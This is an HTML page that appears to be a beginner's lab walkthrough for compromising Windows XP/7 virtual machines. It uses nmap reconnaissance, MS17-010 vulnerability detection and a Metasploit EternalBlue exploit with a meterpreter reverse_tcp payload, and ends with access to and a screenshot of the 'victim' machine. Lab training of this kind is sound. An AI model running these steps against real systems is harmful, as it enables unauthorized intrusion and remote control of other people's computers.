<titel><h2><center>Basic  Pentesting walkthrough  on Windows xp &7</center></h2></titel>
<ol><b>Step 1 </b>: Check the IP address of  your  linux machine .</ol>
<ul> Now let's go For getting the IP address of our  system use command ifconfig in the terminal.</ul>
<center><img src ="kaliip1.png" width ="300px" heigth ="150" alt="image"></center>
<ul> Now , Here we got our IP address of our  the system (“10.0.2.4”)</ul>
<ol><b>Step 2 :</b> Here need to scan the network by using Nmap scanning tool<p>.
[ NMAP:- Nmap or Network Mapper is undoubtedly the best reconnaissance tool used by modern penetration testers. This open-source application has come a long way since its inception and proved to be a game-changer in network security.]<br><p>
<h4 style="color:green;">Now the game begins</h4>
<ul> (i) After the confirmation our  IP address.</ul>
<ul>(ii) For finding the target IP address we use colour =  “-sn”  in the terminal box. ( “ping scan”)</ul>
<ul>(iii) Now we have our target ip address (“10.0.2.5”)</ul><br>
<center><img src="nmap -sV -O .png" width ="300px" heigth ="150"></center><br>
<ul>(iv) Now we need to find the  information like ports and version  and service of the system he is using in it .</ul>
<ul>(v) Let's go for that using (“-sV”) we get all the information that  we want about the target system.</ul><p>
<b>Step 3: </b> In the top figure we can see all the information about the target  system.
<ul>(i) Add in the -A flag on your Nmap command, so you can discover the operating system information of the hosts that are mapped. 
<ul>(ii) The -A flag can be used in combination with other Nmap commands</ul>
<ul>(iii)-T4 is used for fast filtering of the network .</ul><br>
<center><img src="namp -sV -p- -A -T4 .png" width ="300px" heigth ="150" alt="image"></center><br>
<ul>(iv) -p- is used to scan all the ports which are in the range of ip address.if we need to scan an specific port then we need to use -p and the port number like (“nmap -p 455 10.0.2.5”) <br/>.
<b> Step 4 </b>:  Now some more interesting thing we got to know is that (“445 port”) number is  open What we are looking for is that we got it in our hands then let's  continue the game <br>.
<center><img src="nmap -p 445 .png" width ="300px" heigth ="150" alt="image"></center><br>
<ul>(i) -p is for the specific port scan -p 445.</ul><br>
<b>Step 5 </b>: The Nmap Scripting Engine (NSE) is one of Nmap’s most influential and adaptable features.<br> (i) It permits clients to compose (and offer) straightforward scripts to automate a wide variety of systems networking tasks. Those Nmap scripts are then executed in parallel with the fast speed and productivity you anticipate from Nmap. Clients can depend on the developing and assorted set of scripts conveyed with Nmap, or compose their own particular to help<p>
<center><img src="nmap --script vuln.png" width ="300px" heigth ="150" alt="image"></center><br>
<ul> (ii) Here we can see the vulnerability by the( “–script vuln”) command ,--script command helps us to find the vulnerability.<ul><br>
<ul> (iii) Common Vulnerabilities and Exposures, stands for a list of publicly disclosed vulnerabilities. The CVE ID number comes from a flaw described in someone’s comment,CVE number we can see in the above fig (“ms17-010”).</ul><br>
<b>Step 6: </b>Start the Kali PostgreSQL Service Start the Kali PostgreSQL Service Metasploit uses PostgreSQL as its database so it needs to be launched first: root@kali:~$ sudo msfdb start [+] Starting database root@kali. Initialize the Metasploit PostgreSQL Database With PostgreSQL up and running, we next need to create and initialize the msf database.<p>
<center><img src="service postgresql start.png" width ="300px" heigth ="150" alt="image"></center><br>
<b>Step 7 :</b>  Launching the  msfconsole in ...Kali linux.<p>
<center><img src="eternal and msfconsole.png" width ="300px" heigth ="150" alt="image"></center><br>
<ul> (i) Here I find some exploits list which are relatable to the Windows 7  & windows xp vulnerability. It may be different for every operating system.. Now I need to try each exploit simultaneously so that I can find the perfect exploit for the victim.<ul>
<b>Step 8 </b>: search platform:windows  type:exploit  port:445 <p>
<ul> (i) Here i am going to search for the platform and the port  & the exploit<ul.><p>
<center><img src="set payloads and show options.png" width ="300px" heigth ="150" alt="image"></center>
(ii) After that we need to use the weakness CVE number or the Eternalblue.<p>
<b>Step 9 :</b> Here I choose the exploit. By using the “use” command I select one exploit to use. Now using “show targets” command I can see the all number of operating system it can be exploited.
 <center><img src= "use  and show options.png" width ="300px" heigth ="150" alt="image"></center><p>
<ol> (i) Using the “show options' ' command I can see all the details required to exploit the victims system.</ol><p>
<b>Step 10 : </b> One more interesting thing is that we  need to add the RHOSTS  with the  target IP address. In the above fig we can see the RHOSTS number is empty at the current setting. We need to set the RHOSTS by giving the command ike (“ SET RHOSTS 10.0.2.5”).<p>
<center><img src="rhosts set and show payloads.png" width ="300px" heigth ="150" alt="image"></center>
(i)After the set of RHOSTS we need to see the payloads by giving the command called show payloads .<br>
(ii) The above fig shows all the payloads ,from that payload we need to choose the one which can have the payload as a meterpreter.<p>
<b>Step 11 </b>:Now we need to set the payload has (“set payload windows/meterpreter/reverse_tcp”) to get the reverse connection to the target device .
<center><img src= "set payloads and show options.png"width ="300px" heigth ="150" alt="image"></center><br>
Here we can see the ip address for the RHOSTS in the above fig that ip address is the target ip address.<p>
<b>Step 12 :</b> Now all set  to go.<p>
(“exploit”) An exploit is an attack that uses a software vulnerability to cause some sort of unintended effect in the targeted system — such as delivering malware or giving the hacker control or other access. Even if a certain vulnerability exists, there’s no immediate danger until someone figures out how to create an exploit for it.

(i) BOOM ! Here we go ,I  got an access of the victim system now we can play around the victims machine with full of fun and joy.<p>
(ii)Now I have access of  the target device. Here we need  migrate the getuid from one PID to another PID’s numbers .

I took and screenshot of the victims machine from our kali linux (“metasploit”)
